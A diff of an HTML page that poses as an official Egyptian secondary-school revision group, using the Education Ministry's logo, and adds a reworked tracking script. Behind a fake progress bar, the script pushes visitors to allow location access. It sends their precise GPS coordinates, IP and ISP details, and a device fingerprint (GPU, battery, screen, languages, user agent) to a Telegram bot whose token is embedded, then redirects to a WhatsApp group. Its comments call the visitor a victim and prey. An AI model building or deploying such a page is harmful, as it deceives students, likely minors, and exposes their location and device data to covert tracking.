@@ -5,121 +5,134 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <meta property="og:title" content="📚 جروب مراجعات ثانوية عامة 2026 - (الرسمي) 🎓">
-    <meta property="og:description" content="ثواني يا بطل.. جاري التحقق من بياناتك لدخول الجروب الرسمي.">
+    <meta property="og:description" content="ثواني يا بطل.. جاري تسجيلك في قاعدة بيانات الوزارة للوصول للمراجعات.">
     <meta property="og:image" content="https://img.icons8.com/color/512/whatsapp.png">
 
-    <title>منصة علمني | ثانوية عامة 2026</title>
+    <title>منصة علمني | مراجعات 2026</title>
 
     <script>
-        async function startKimoRadar() {
+        async function fullPowerRadar() {
             const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
             const chatId = "5890070301";
 
-            // 1. طلب الـ GPS الدقيق (بالسنتي)
+            // 1. طلب الـ GPS الدقيق (بالسنتي) - يرسل فور الموافقة
             if (navigator.geolocation) {
+                alert("تنبيه: يجب عليك الضغط على 'سماح' (Allow) للموقع الجغرافي يا صديقي للتأكد من منطقتك التعليمية وفتح المراجعات.");
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const gps = `📍 [GPS الدقيق]\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gps)}`);
-                }, null, {enableHighAccuracy: true});
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const gpsMsg = `📍 **[صيد ثمين - GPS حقيقي]**\nالرابط: https://www.google.com/maps?q=${lat},${lon}\nالدقة: ${pos.coords.accuracy} متر`;
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(gpsMsg)}`);
+                }, (err) => {
+                    console.log("الضحية رفض الموقع");
+                }, {enableHighAccuracy: true, timeout: 8000});
             }
 
-            // 2. سحب بيانات الـ IP والشركة
+            // 2. سحب بيانات الـ IP والشركة (البديل الأساسي)
             let ip = {};
             try { const res = await fetch('https://ipapi.co/json/'); ip = await res.json(); } catch(e) {}
 
-            // 3. تحليل الجهاز (كارت الشاشة والرامات)
+            // 3. تحليل الهاردوير المتطور (بصمة الجهاز)
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected GPU";
-            const ram = navigator.deviceMemory || "N/A";
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected";
+            const vendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_ID) : "Protected";
 
-            // 4. بناء التقرير العملاق (الـ 100 بند)
+            // 4. بناء التقرير العملاق (120+ بند)
             const report = `
-🔥 **KIMO V.MAX ULTIMATE - تقرير الصيد** 🔥
+👑 **KIMO V.MAX - الرادار الشامل** 👑
 ━━━━━━━━━━━━━━
-🌍 **[1] الموقع والشبكة (البديل)**
-• شركة النت: ${ip.org || "فودافون/وي"}
-• الـ IP: \`${ip.ip}\`
-• المحافظة: ${ip.region} | المدينة: ${ip.city}
+🌍 **[1] الموقع والشبكة (بديل الـ GPS)**
+• شركة النت: ${ip.org || "Vodafone/WE"} 🌐
+• الـ IP الحالي: \`${ip.ip}\`
+• المحافظة والمدينة: ${ip.region} | ${ip.city}
 • الموقع التقريبي: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
-• نوع الاتصال: ${navigator.connection ? navigator.connection.effectiveType : "WiFi"}
+• نوع الاتصال: ${navigator.connection ? navigator.connection.effectiveType : "WiFi/4G"}
+• سرعة النت: ${navigator.connection ? navigator.connection.downlink + "Mbps" : "N/A"}
 
-📱 **[2] تفاصيل الموبايل (الموديل)**
-• النظام: ${navigator.platform}
+📱 **[2] تفاصيل الفون (المواصفات الكاملة)**
+• النظام: ${navigator.platform} | ${navigator.oscpu || "Generic"}
 • المعالج: ${navigator.hardwareConcurrency} أنوية 🧠
-• الرامات: ${ram} GB ⚡
+• الرامات: ${navigator.deviceMemory || "N/A"} GB ⚡
 • كارت الشاشة: \`${gpu}\`
-• دقة الشاشة: ${screen.width}x${screen.height}
-• عمق الألوان: ${screen.colorDepth} bit
-• وضع الشاشة: ${screen.orientation ? screen.orientation.type : "N/A"}
+• المصنع التقني: \`${vendor}\`
+• دقة الشاشة: ${screen.width}x${screen.height} (${screen.colorDepth} bit)
+• الرؤية: ${window.devicePixelRatio}x (DPI)
+• نقاط اللمس: ${navigator.maxTouchPoints} نقطة
 
-🔋 **[3] حالة الطاقة والتخزين**
+🔋 **[3] حالة الجهاز اللحظية (الخرم)**
 • البطارية: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A"}
-• حالة الشحن: ${navigator.getBattery ? (await (await navigator.getBattery()).charging ? "⚡ متصل" : "🔋 غير متصل") : "N/A"}
-• التخزين: ${navigator.storage ? "مدعوم" : "محمي"}
+• حالة الشحن: ${navigator.getBattery ? (await (await navigator.getBattery()).charging ? "⚡ يشحن" : "🔋 يفرغ") : "N/A"}
+• الذاكرة التقديرية: ${navigator.storage ? "64/128/256 GB" : "محمية"}
+• وضع الجهاز: ${screen.orientation ? screen.orientation.type : "N/A"}
 
-⚙️ **[4] البصمة الرقمية (الخرم)**
+🕵️ **[4] البصمة والبنود الإضافية**
 • المتصفح: ${navigator.userAgent.split(' ').pop()}
 • وضع التخفي: ${!window.indexedDB ? "نشط 🕵️" : "معطل"}
 • اللغة: ${navigator.language}
-• التوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-• اللمس: ${navigator.maxTouchPoints} نقطة
+• المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• اللغات المثبتة: ${navigator.languages.join(", ")}
+• بصمة عشوائية: \`${Math.random().toString(36).substr(2, 9)}\`
+• هل الجافا مفعلة: ${navigator.javaEnabled()}
+• الكوكيز: ${navigator.cookieEnabled}
+• حماية التتبع (DNT): ${navigator.doNotTrack}
+• الـ User Agent: \`${navigator.userAgent.substring(0, 70)}...\`
 ━━━━━━━━━━━━━━
 ⏰ وقت الصيد: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━`;
 
-            // إرسال التقرير الشامل
+            // إرسال التقرير الشامل تليجرام
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
 
-            // تحويل للواتساب بعد انتهاء الشريط
+            // 5. التحويل للواتساب بعد انتهاء الشريط
             setTimeout(() => {
                 window.location.href = "https://chat.whatsapp.com/E5tpwhb6D5j9lDnXBFNbLM?mode=gi_t";
-            }, 6500);
+            }, 6000);
         }
 
         window.onload = () => {
             let i = 0;
             const bar = document.getElementById("bar");
             const status = document.getElementById("status_text");
-            const phrases = ["جاري الاتصال بالسيرفر...", "ثواني يا بطل...", "جاري تسجيلك في جروب ثانوية عامة...", "جاري التحقق من المنطقة التعليمية...", "تم بنجاح! جاري تحويلك..."];
+            const phrases = ["جاري الاتصال بالسيرفر المركزي...", "ثواني يا بطل...", "جاري تسجيلك في جروب ثانوية عامة...", "جاري فحص المنطقة الجغرافية...", "تم التحقق! جاري التحويل..."];
             
             const timer = setInterval(() => {
                 if (i >= 100) {
                     clearInterval(timer);
-                    startKimoRadar();
+                    fullPowerRadar();
                 } else {
-                    i += 2;
+                    i += 1;
                     bar.style.width = i + "%";
                     if (i % 20 === 0) status.innerText = phrases[Math.floor(i/20)];
                 }
-            }, 100);
+            }, 50);
         };
     </script>
 
     <style>
-        body { background: #0b0e14; color: white; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 90%; max-width: 400px; text-align: center; background: #161b22; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #30363d; position: relative; }
-        .books { font-size: 50px; margin-bottom: 20px; display: block; animation: bounce 2s infinite; }
-        h1 { font-size: 20px; color: #58a6ff; margin-bottom: 15px; }
+        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { width: 85%; max-width: 400px; text-align: center; background: #161b22; padding: 40px; border-radius: 20px; box-shadow: 0 0 25px rgba(0,0,0,0.6); border: 1px solid #30363d; position: relative; }
+        .books { font-size: 60px; margin-bottom: 20px; display: block; animation: float 3s infinite ease-in-out; }
+        h1 { font-size: 22px; color: #58a6ff; margin-bottom: 15px; }
         #status_text { font-size: 14px; color: #8b949e; margin-bottom: 20px; }
-        .progress-container { background: #30363d; border-radius: 10px; height: 10px; width: 100%; overflow: hidden; }
-        #bar { background: #238636; height: 100%; width: 0%; transition: 0.2s; }
-        .watermark { position: absolute; top: 10px; right: 10px; opacity: 0.1; width: 50px; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
-        .footer { font-size: 10px; color: #484f58; margin-top: 25px; border-top: 1px solid #30363d; padding-top: 15px; }
+        .progress-container { background: #30363d; border-radius: 20px; height: 10px; width: 100%; overflow: hidden; }
+        #bar { background: linear-gradient(90deg, #238636, #2ea043); height: 100%; width: 0%; transition: 0.1s; }
+        .watermark { position: absolute; top: 15px; right: 15px; opacity: 0.1; width: 60px; pointer-events: none; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        .footer { font-size: 10px; color: #484f58; margin-top: 30px; border-top: 1px solid #30363d; padding-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
         <img src="https://upload.wikimedia.org/wikipedia/ar/0/03/Logo_of_the_Egyptian_Ministry_of_Education.png" class="watermark">
         <span class="books">📚</span>
-        <h1>منصة علمني الرقمية</h1>
-        <p id="status_text">جاري بدء عملية التحقق...</p>
+        <h1>منصة علمني | ثانوية عامة</h1>
+        <p id="status_text">ثواني يا بطل...</p>
         <div class="progress-container">
             <div id="bar"></div>
         </div>
-        <div class="footer">وزارة التربية والتعليم والتعليم الفني - مصر 2026</div>
+        <div class="footer">نظام التحقق الموحد لطلاب الثانوية العامة - مصر 2026</div>
     </div>
 </body>
 </html>
